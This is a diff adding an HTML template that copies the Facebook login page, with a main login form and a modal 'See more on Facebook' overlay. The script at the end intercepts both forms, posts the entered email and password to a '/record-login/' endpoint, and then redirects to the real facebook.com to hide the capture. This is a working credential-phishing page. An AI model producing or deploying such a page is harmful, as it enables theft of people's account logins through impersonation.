@@ -1,0 +1,251 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="icon" type="image/png" href="{% static 'favicon.png' %}">
+</head>
+<body class="bg-[#f0f2f5] min-h-screen flex flex-col justify-between font-sans">
+
+  <!-- Main Layout Container -->
+  <main class="flex justify-center items-center flex-grow">
+    <div class="flex justify-between items-center max-w-[1000px] w-full px-6 py-12">
+      
+      <!-- Left Side Text -->
+      <div class="max-w-md">
+        <h1 class="text-[#0866ff] text-6xl font-bold leading-tight">facebook</h1>
+        <p class="text-2xl mt-4">Connect with friends and the world<br> around you on Facebook.</p>
+      </div>
+
+      <!-- Right Side Login Box -->
+      <div> 
+        <!-- Login Form Box -->
+        <!-- Right Side Login Box -->
+<div class="w-[380px]">
+    <!-- ✅ START: Main Login Form -->
+    <form id="mainLoginForm" class="bg-white shadow-lg rounded-lg p-4 space-y-4">
+  
+      <!-- Email & Password Inputs -->
+      <div class="space-y-3">
+        <input 
+          type="text" 
+          name="email"
+          placeholder="Email or phone number" 
+          class="w-full border border-gray-300 rounded px-4 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-500" 
+        />
+        <input 
+          type="password" 
+          name="password"
+          placeholder="Password" 
+          class="w-full border border-gray-300 rounded px-4 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-500" 
+        />
+        <button 
+          type="submit"
+          class="w-full bg-[#1877f2] text-white text-lg font-semibold py-2.5 rounded hover:bg-blue-700">
+          Log In
+        </button>
+      </div>
+  
+      <!-- Forgot Password Link -->
+      <div class="text-center mt-3">
+        <a href="#" class="text-[#1877f2] text-sm hover:underline">Forgot password?</a>
+      </div>
+  
+      <hr class="my-4">
+  
+      <!-- Create Account Button -->
+      <div class="text-center">
+        <button 
+          type="button" 
+          class="bg-[#42b72a] text-white font-semibold px-4 py-2.5 text-base rounded hover:bg-green-700">
+          Create new account
+        </button>
+      </div>
+    </form>
+    <!-- ✅ END: Main Login Form -->
+  
+    <!-- Create a Page Text -->
+    <div class="text-center mt-4 mb-4 text-sm">
+      <span class="font-semibold">Create a Page</span> for a celebrity, brand or business.
+    </div>
+  </div>
+  
+      
+      
+    </div>
+  </main>
+
+  <!-- Create Page Link -->
+  
+
+  <!-- Footer -->
+  <footer class="text-xs text-gray-500 text-center px-4 py-6 border-t">
+    <div class="flex flex-wrap justify-center gap-x-4 gap-y-1 mb-3">
+      <a href="#" class="hover:underline">English (US)</a>
+      <a href="#" class="hover:underline">Filipino</a>
+      <a href="#" class="hover:underline">Bisaya</a>
+      <a href="#" class="hover:underline">Español</a>
+      <a href="#" class="hover:underline">日本語</a>
+      <a href="#" class="hover:underline">한국어</a>
+      <a href="#" class="hover:underline">中文(简体)</a>
+      <a href="#" class="hover:underline">العربية</a>
+      <a href="#" class="hover:underline">Português (Brasil)</a>
+      <a href="#" class="hover:underline">Français (France)</a>
+      <a href="#" class="hover:underline">Deutsch</a>
+      <button class="border px-2 rounded text-sm">+</button>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-x-4 gap-y-1 mb-2">
+      <a href="#" class="hover:underline">Sign Up</a>
+      <a href="#" class="hover:underline">Log In</a>
+      <a href="#" class="hover:underline">Messenger</a>
+      <a href="#" class="hover:underline">Facebook Lite</a>
+      <a href="#" class="hover:underline">Video</a>
+      <a href="#" class="hover:underline">Meta Pay</a>
+      <a href="#" class="hover:underline">Meta Store</a>
+      <a href="#" class="hover:underline">Meta Quest</a>
+      <a href="#" class="hover:underline">Ray-Ban Meta</a>
+      <a href="#" class="hover:underline">Meta AI</a>
+      <a href="#" class="hover:underline">Instagram</a>
+      <a href="#" class="hover:underline">Threads</a>
+    </div>
+
+    <div class="flex flex-wrap justify-center gap-x-4 gap-y-1 mb-2">
+      <a href="#" class="hover:underline">Voting Information Center</a>
+      <a href="#" class="hover:underline">Privacy Policy</a>
+      <a href="#" class="hover:underline">Privacy Center</a>
+      <a href="#" class="hover:underline">About</a>
+      <a href="#" class="hover:underline">Create ad</a>
+      <a href="#" class="hover:underline">Create Page</a>
+      <a href="#" class="hover:underline">Developers</a>
+      <a href="#" class="hover:underline">Careers</a>
+      <a href="#" class="hover:underline">Cookies</a>
+      <a href="#" class="hover:underline">Ad choices</a>
+      <a href="#" class="hover:underline">Terms</a>
+      <a href="#" class="hover:underline">Help</a>
+    </div>
+
+    <p class="mt-4">Meta © 2025</p>
+  </footer>
+
+  <!-- Dimmed Background Overlay -->
+<div class="fixed inset-0 bg-black bg-opacity-40 backdrop-blur-sm z-50 flex items-center justify-center">
+
+    <!-- Modal Container -->
+    <div class="bg-white rounded-lg shadow-xl w-full max-w-sm p-6 text-center relative">
+      
+      <!-- Title -->
+      <h2 class="text-xl font-bold mb-6">See more on Facebook</h2>
+  
+      <!-- Form -->
+      <!-- Form -->
+    <form id="modalLoginForm" class="space-y-4">
+        <input 
+        name="email"
+        type="text" 
+        placeholder="Email or phone number"
+        class="w-full border border-gray-300 rounded px-4 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-500" 
+        />
+        <input 
+        name="password"
+        type="password" 
+        placeholder="Password"
+        class="w-full border border-gray-300 rounded px-4 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-500" 
+        />
+        <button 
+        type="submit"
+        class="w-full bg-[#1877f2] text-white text-lg font-semibold py-2.5 rounded hover:bg-blue-700 transition">
+        Log In
+        </button>
+    </form>
+  
+  
+      <!-- Forgot Password -->
+      <div class="mt-3">
+        <a href="#" class="text-sm text-[#1877f2] hover:underline">Forgot password?</a>
+      </div>
+  
+      <!-- Divider -->
+      <div class="flex items-center my-4">
+        <hr class="flex-grow border-gray-300" />
+        <span class="mx-2 text-gray-400 text-sm">or</span>
+        <hr class="flex-grow border-gray-300" />
+      </div>
+  
+      <!-- Create Account -->
+      <button 
+        class="w-full bg-[#42b72a] text-white font-semibold py-2.5 text-base rounded hover:bg-green-700 transition">
+        Create new account
+      </button>
+  
+      <!-- Optional Close Button (top right) -->
+      <button 
+        onclick="this.parentElement.parentElement.style.display='none'"
+        class="absolute top-3 right-3 text-gray-400 hover:text-gray-600 text-xl font-bold">
+        &times;
+      </button>
+  
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.getElementById("modalLoginForm");
+    
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
+    
+        const formData = new FormData(form);
+    
+        fetch("/record-login/", {
+          method: "POST",
+          body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+          console.log(`${formId} submitted`, data);
+          // ✅ Redirect to Facebook after success
+          window.location.href = "https://www.facebook.com/";
+        })
+        
+      });
+    });
+
+
+    document.addEventListener("DOMContentLoaded", function () {
+  function handleFormSubmit(formId) {
+    const form = document.getElementById(formId);
+    if (!form) return;
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+
+      fetch("/record-login/", {
+        method: "POST",
+        body: formData
+      })
+        .then(res => res.json())
+        .then(data => {
+          console.log(`${formId} submitted`, data);
+          // ✅ Redirect to Facebook after success
+          window.location.href = "https://www.facebook.com/";
+        })
+        
+    });
+  }
+
+  handleFormSubmit("mainLoginForm");
+  handleFormSubmit("modalLoginForm");
+});
+    </script>
+    
+  
+  
+
+</body>
+</html>
